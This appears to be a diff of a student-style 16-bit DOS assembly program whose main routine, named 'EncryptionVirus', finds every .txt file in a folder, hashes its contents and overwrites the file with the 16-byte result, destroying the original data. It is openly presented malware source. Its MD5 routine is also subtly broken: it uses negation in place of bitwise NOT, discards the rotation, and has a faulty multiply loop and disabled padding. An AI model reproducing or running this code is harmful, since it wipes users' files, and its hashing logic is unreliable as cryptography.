@@ -1,248 +1,406 @@
 Include irvine16.inc
 
-FileControlBlock struc
-db 22 dup(?) ; header info 
-fileTime dw ? ; time stamp of file
-fileDate dw ? ; date stamp of file
-fileSize dd ? ; size of file
-fileName db 13 dup(0) ; name of file found by DOS
+FileControlBlock struc 	;File Data
+db 22 dup(?) 			;header info 
+FileTime dw ? 			;time stamp of file
+FileDate dw ? 			;date stamp of file
+FileSize dd ? 			;size of file
+FileName db 13 dup(0) 	;name of file found by DOS
 FileControlBlock ends
 
-.data
-filespec db "C:\N\*.txt",0
-DTA FileControlBlock <>
-filehandle dw ?
-bufferSize = 64
-namefile db 13 DUP(?),0
-buffer db bufferSize dup(0),0
-currsize dw 0
-padnum db buffersize dup(0)
-.code
-main PROC
+.DATA
+FolderPath db "C:\N\*.txt",0 	;Path of search folder
+DTA FileControlBlock <>			;Point the file data struct to user-defined DTA
+FileHandle dw ?
+BufferSize = 64					;To read 512-bit per time (64 byte)
+FileFullPath db 260 DUP(?),0	;File full path after adding name found by DOS to it
+Buffer db bufferSize dup(0),0	;Buffer to read data from file to it
+CurrentSize dw 0				;Indicator to file size to be used in padding (step in MD5)
 
-;-----------------------
-;Intialize datasegment
-;-----------------------
-mov ax,@data       ; initialize DS
-mov ds,ax
-mov ah,1Ah           ; set transfer address
-mov dx,offset DTA
+RotationIndex Byte 0			;Index to Rotation array to indicate number of rotations per round
+TIndex Word 0					;Index to T array to use per round
+K DWord 0
+
+A DWord 01234567h
+B DWord 89ABCDEFh
+E DWord 0FEDCBA98h
+D DWord 78543210h
+
+T DWord 0D76AA478h,0E8C7B756h,242070DBh,0C1BDCEEEh,0F75C0FAFh,4787C62Ah,0A8304613h,0FD469501h,698098D8h,8B44F7AFh,0FFFF5BB1h,895CD7BEh,6B901122h,0FD987193h,0A679438Eh,49B40821h
+  DWord 0F61E2562h,0C040B340h,265E5A51h,0E9B6C7AAh,0D62F105Dh,02441453h,0D8A1E681h,0E7D3FBC8h,21E1CDE6h,0C33707D6h,0F4D50D87h,455A14EDh,0A9E3E905h,0FCEFA3F8h,676F02D9h,8D2A4C8Ah
+  DWord 0FFFA3942h,8771F681h,699D6122h,0FDE5380Ch,0A4BEEA44h,4BDECFA9h,0F6BB4B60h,0BEBFBC70h,289B7EC6h,0EAA127FAh,0D4EF3085h,04881D05h,0D9D4D039h,0E6DB99E5h,1FA27CF8h,0C4AC5665h
+  DWord 0F4292244h,432AFF97h,0AB9423A7h,0FC93A039h,655B59C3h,8F0CCC92h,0FFEFF47Dh,85845DD1h,6FA87E4Fh,0FE2CE6E0h,0A3014314h,4E0811A1h,0F7537E82h,0BD3AF235h,2AD7D2BBh,0EB86D391h
+
+Rotation Byte 7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22
+		 Byte 5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20
+		 Byte 4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23
+		 Byte 6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21
+			  
+HashedData DWord 4 DUP(?)
+
+			  
+.CODE
+
+;----------------------------------------------------------------------------
+;Get first file with specific extension from the given folder
+;Recieves: SI contain offset of the path to search in
+;Returns Data of first file found
+;----------------------------------------------------------------------------
+FindFirstFile PROC
+mov AH,1Ah			;Set DTA
+mov DX,offset DTA	;point DX to DTA returned by OS
 int 21h
 
+mov AH , 4Eh					;Dos function search for 1st matching file
+mov CX , 1						;Normal attribute
+mov DX , SI
+int 21h    
+JC Quit                             ; call Dos
+RET
+FindFirstFile ENDP
 
-call Open_Read_all
+;----------------------------------------------------------------------------
+;Get next file with specific extension from the given folder
+;Recieve Nothing
+;Returns Data of current file found
+;----------------------------------------------------------------------------
+FindNextFile PROC
+mov AH, 4Fh
+int 21h
+JC Quit
+RET
+FindNextFile ENDP
 
-quit::
+;----------------------------------------------------------------------------
+;append file name to the folder path
+;Recieve: SI contain offset of folder path
+;		: DI contain offset that will contain file full path
+;Returns FileFullPath contains the full path of file including file name
+;----------------------------------------------------------------------------
+GetFilePath PROC USES ECX
+CopyPath:					;Copy folder path into FileFullPath var
+CMP Byte Ptr [SI],'*'
+JE Break
+MOVSB
+JMP CopyPath
 
-mov ax , '#'
-call writechar
-call crlf
+Break:
+mov CX,LENGTHOF DTA.FileName
+mov SI,offset DTA.FileName
+
+REP MOVSB					;Append file name to file full path
+
+RET
+GetFilePath ENDP
+
+;----------------------------------------------------------------------------
+;Open current found file
+;Recieve: DX contain offset of file path
+;Returns Nothing
+;----------------------------------------------------------------------------
+OpenFile PROC USES EAX
+mov AH,3Dh			;Open file
+mov AL,2			;Choose the input mode(2 to read&write)
+int 21h
+JC Quit
+mov FileHandle,AX
+RET
+OpenFile ENDP
+
+;----------------------------------------------------------------------------
+;Read current opened file
+;Recieve: Nothing
+;Returns AX conatains number of bytes retrieved from the file 
+;----------------------------------------------------------------------------
+ReadFile PROC USES ECX EDX
+mov CX,  BufferSize		;Number of bytes to read 
+mov DX,offset Buffer                                              
+int 21h  
+JC Quit
+RET
+ReadFile ENDP
+
+;----------------------------------------------------------------------------
+;Write file data after hashing in the same file
+;Recieve: SI contain offset of array contains final A,B,C,D
+;		: DX conatain offset of the file full path
+;Returns Nothing
+;----------------------------------------------------------------------------
+WriteEncryptedData PROC USES EAX ECX EBX
+mov AH , 3Ch			;If the file already exist overwrite data in it, If file not exist create it
+mov CX , 0				;Normal attribute
+int 21h
+JC Quit
+mov AH , 40h			;Write data to file
+mov CX , 16				;To write 128-bit returned from Md5
+mov BX , FileHandle
+int 21h
+JC Quit
+mov AH , 3Eh			;Close File
+int 21h
+RET
+WriteEncryptedData ENDP
+
+;----------------------------------------------------------------------------
+;Multpliy two numbers
+;Recieves: EDI Contains the first number
+;		 : K Contains the second number
+;Returns : EDI Contains the result of the multiplication
+;----------------------------------------------------------------------------
+Multiply PROC USES ECX
+mov ECX,EDI
+L:
+ADD EDI,K
+LOOP L
+RET
+Multiply ENDP
+
+;----------------------------------------------------------------------------
+;The First Funnction of MD5 Encryption (F(B,E,D)=(B AND E) OR (NOT B AND D)
+;Recieves: Values of B,E,D
+;Returns EBX Contains the value returned form the equation
+;----------------------------------------------------------------------------
+F PROC USES ECX
+mov EBX,B
+AND EBX,E	;EBX=(B AND E)
+mov ECX,B
+neg ECX
+AND ECX,D	;ECX=(NOT B AND D)
+OR EBX,ECX
+RET
+F ENDP
+
+;----------------------------------------------------------------------------
+;The Second Funnction of MD5 Encryption (G(B,E,D)=(B AND D) OR (E AND NOT D)
+;Recieves: Values of B,E,D
+;Returns EDX Contains the value returned form the equation
+;----------------------------------------------------------------------------
+G PROC USES EBX
+mov EBX,B
+AND EBX,D	;EBX= (B AND D)
+mov EDX,D
+neg EDX
+AND EDX,E	;EDX=(E AND NOT D)
+OR EDX,EBX
+RET
+G ENDP
+
+;----------------------------------------------------------------------------
+;The Third Funnction of MD5 Encryption (H(B,E,D)=B XOR E XOR D
+;Recieves: Values of B,E,D
+;Returns EAX Contains the value returned form the equation
+;----------------------------------------------------------------------------
+H PROC
+mov EAX,B
+XOR EAX,E	;EAX=(B XOR E)
+XOR EAX,D
+RET
+H ENDP
+
+;----------------------------------------------------------------------------
+;The Fourth Funnction of MD5 Encryption (I(B,E,D)=E XOR (B OR NOT D)
+;Recieves: Values of B,E,D
+;Returns ECX Contains the value returned form the equation
+;----------------------------------------------------------------------------
+I PROC USES EBX
+mov ECX,E
+mov EBX,D
+neg EBX
+OR EBX,B	;EBX=(B OR NOT D)
+XOR ECX,EBX
+RET
+I ENDP
+
+;----------------------------------------------------------------------------
+;The Funnction of MD5 
+;Recieves: EAX Contains result of one of the four encryption functions.
+;		 : EBX Contains 32-bit block of data from current 512 bit block.
+;		 : IterationIndex Conatins the index of the current round.
+;Returns (Modify) the values of the four variables A,B,E,D
+;----------------------------------------------------------------------------
+MD5 PROC USES EDX
+
+XOR EAX,A							;EAX=(EAX XOR A)
+XOR EAX,EBX							;EAX=(EAX XOR EBX)
+PUSH ESI
+movsx ESI,TIndex
+XOR EAX,T[ESI]						;EAX=(EAX XOR Table)
+movsx ESI, RotationIndex
+mov EAX,0
+XOR AL,Rotation[ESI]				;EAX=(EAX Rotated)
+POP ESI
+XOR EAX,B							;EAX=(EAX XOR B)
+
+mov EDX,D
+mov A,EDX
+mov EDX,E
+mov D,EDX
+mov EDX,B
+mov E,EDX
+mov B,EAX
+
+RET
+MD5 ENDP
+
+;----------------------------------------------------------------------------
+;The Funnction of MD5Controller 
+;Recieves:Nothing
+;Returns :Nothing
+;----------------------------------------------------------------------------
+MD5Controller PROC
+
+mov ECX,16
+FCall:
+PUSH AX
+;mov AX,K*4
+mov SI,offset BUFFER
+ADD SI,AX
+POP AX
+INC K
+Call F
+mov EAX,EBX
+mov EBX,[SI]
+Call MD5
+INC RotationIndex
+ADD TIndex,TYPE T
+LOOP FCall
+
+mov K,0
+mov ECX,16
+GCall:
+mov EDI,5
+Call Multiply
+mov K,EDI
+ADD K,1
+mov K,EAX
+mov EDX,0
+mov EBX,16
+DIV EBX
+mov K,EDX
+PUSH AX
+;mov AX,K*4
+mov SI,offset BUFFER
+ADD SI,AX
+POP AX
+Call G
+mov EAX,EDX
+mov EBX,[SI]
+Call MD5
+INC RotationIndex
+ADD TIndex,TYPE T
+LOOP GCall
+
+mov K,0
+mov ECX,16
+HCall:
+mov EDI,3
+Call Multiply
+mov K,EDI
+ADD K,5
+mov K,EAX
+mov EDX,0
+mov EBX,16
+DIV EBX
+mov K,EDX
+PUSH AX
+;mov AX,K*4
+mov SI,offset BUFFER
+ADD SI,AX
+POP AX
+Call H
+mov EBX,[SI]
+Call MD5
+INC RotationIndex
+ADD TIndex,TYPE T
+LOOP HCall
+
+mov K,0
+mov ECX,16
+ICall:
+mov EDI,7
+Call Multiply
+mov K,EDI
+mov K,EAX
+mov EDX,0
+mov EBX,16
+DIV EBX
+mov K,EDX
+PUSH AX
+;mov AX,K*4
+mov SI,offset BUFFER
+ADD SI,AX
+POP AX
+PUSH ECX
+Call I
+mov EAX,ECX
+mov EBX,[SI]
+Call MD5
+INC RotationIndex
+ADD TIndex,TYPE T
+POP ECX
+LOOP ICall
+RET
+MD5Controller ENDP
+
+;----------------------------------------------------------------------------
+;The Main Controller of the project to call all functions
+;Recieves: Nothing
+;Returns : Nothing
+;----------------------------------------------------------------------------
+EncryptionVirus PROC
+mov SI , offset FolderPath
+Call FindFirstFile
+
+EncryptFiles:
+mov DI ,offset FileFullPath
+Call GetFilePath
+mov DX,offset FileFullPath
+Call OpenFile
+
+mov AH,3Fh				;Read from file
+mov BX,FileHandle
+ReadData:
+Call ReadFile
+CMP AX , 0
+JE EndOfFile 
+mov CurrentSize , AX
+Call MD5Controller                                                                             
+JMP ReadData
+
+EndOfFile:
+;Call Padding
+;Call MD5Controller
+
+PUSH EAX
+mov EAX,A
+mov HashedData[0],EAX
+mov EAX,B
+mov HashedData[4],EAX
+mov EAX,E
+mov HashedData[8],EAX
+mov EAX,D
+mov HashedData[12],EAX
+POP EAX
+
+mov AH , 3Eh			;Close file
+int 21h
+
+mov SI,offset HashedData
+mov DX,offset FileFullPath
+Call WriteEncryptedData
+
+Call FindNextFile
+
+JMP EncryptFiles
+
+RET
+EncryptionVirus ENDP
+
+main PROC
+mov AX,@data		;Initialize Data segment
+mov DS,AX
+Call EncryptionVirus
+Quit::
 .EXIT 
 main ENDP
-
-;------------------------------------------------
-;clear_str PROC
-;intialize buffer by 0 
-;
-;-------------------------------------------------
-clear_str PROC USES CX DI
-mov cx , buffersize
-mov di , 0
- do:
-    
-     mov buffer[di] , 0
-	 inc di 
-	 
- LOOP do
-RET
-clear_str ENDP
-;------------------------------------------------
-;get first matched file with the given path
-;
-;-------------------------------------------------
-
-Find_first_file PROC
-
-mov ah , 4Eh                            ;Dos function search for 1st matching file
-mov cx , 1
-mov dx , offset filespec                ;given path
-int 21h                                 ; call Dos
-RET
-Find_first_file ENDP
-
-;------------------------------------------------
-; find next matched files
-;-------------------------------------------------
-Find_next_file PROC
-
-mov ah, 4Fh
-int 21h
-jc quit
-
-RET
-Find_next_file ENDP
-;------------------------------------------------
-;append file name found to the path to open it
-;-------------------------------------------------
-get_filepath PROC
-
-mov di,offset filespec
-mov si,offset namefile
-
-Copy:
-cmp byte ptr [di],"*"            ;loop to copy path into namefile var
-je break
-mov ax,[di]
-mov [si],ax
-inc di
-inc si
-JMP Copy
-break:
-
-mov cx,lengthof DTA.fileName
-mov di,offset DTA.fileName
-
-Copy2:                          ;loop to append filename found to the path
-mov ax,[di]
-mov [si],ax
-inc di
-inc si
-LOOP Copy2
-
-RET
-get_filepath ENDP
-;------------------------------------------------
-;take the path and open the file
-;-------------------------------------------------
-Openfile PROC
-
-mov ah,3Dh                   ;  open file
-mov al,2                     ; choose the input mode
-mov dx,offset namefile
-int 21h                      ; call DOS
-jc quit
-mov filehandle,ax  
-mov bx , filehandle          ; no error: save the handle
-
-RET
-Openfile ENDP
-
-;------------------------------------------------
-; read the opened file
-;------------------------------------------------
-
-Readfile PROC
-
-READ :
-
-mov ah,3Fh                                      ; read from file or device
-mov bx,filehandle                               ; BX = file handle
-mov cx,  buffersize                             ; number of bytes to read 
-mov dx,offset buffer                            ; point to buffer                                              
-int 21h  
-jc quit
-cmp ax , 0
-je Done 
-mov currsize , ax 
-; call encryption                                       
-call writestring 
-call clear_str                                     
-jmp READ
-
-Done:
-call crlf 
-call Padding
-closeFile:
-mov ah , 3Eh
-int 21h
-
-
-RET
-Readfile ENDP
-
-;------------------------------------------------
-; main function that call other functions
-;-------------------------------------------------
-Open_Read_all PROC
-
-CALL find_first_file
-jmp Begin
-
-NextFile:
-CALL find_next_file
-
-Begin:
-CALL get_filepath
-CALL Openfile
-CALL Readfile
-CALL Write_encrypted_msg
-jmp NextFile
-
-RET
-Open_Read_all ENDP
-
-;------------------------------------------------
-;padding function
-;------------------------------------------------
-
-Padding PROC uses EBX
-
-cmp currsize , 64
-je pad_size
-
-mov  DI , currsize
-or   buffer[DI] , 80h
-
-;call encryption
-
-pad_size:
-
-call clear_str
-
-mov SI , 60
-mov ECX , 4
-mov DI , 0
-
-DO:                                     ;loop to append size of the file in the last 4 bytes
-mov bl , byte ptr [DTA.fileSize[DI]]
-mov buffer[SI] , bl
-inc SI
-inc DI
-LOOP DO
-
-; call encryption
-RET
-Padding ENDP
-;------------------------------------------------
-;After encryption it clear the content of the 
-;file and write the new encrypted msg
-;------------------------------------------------
-
-Write_encrypted_msg PROC
-
-Repalce_file:
-mov AH , 3Ch
-mov CX , 0
-mov DX , offset namefile
-int 21h
-jc quit
-
-mov filehandle , AX
-
-
-write_msg:
-mov AH , 40h
-mov CX , 16
-mov DX , offset buffer
-call crlf
-mov BX , filehandle
-int 21h
-jc quit
-
-closeFile:
-mov AH , 3Eh
-int 21h
-RET
-Write_encrypted_msg ENDP
-
 END main
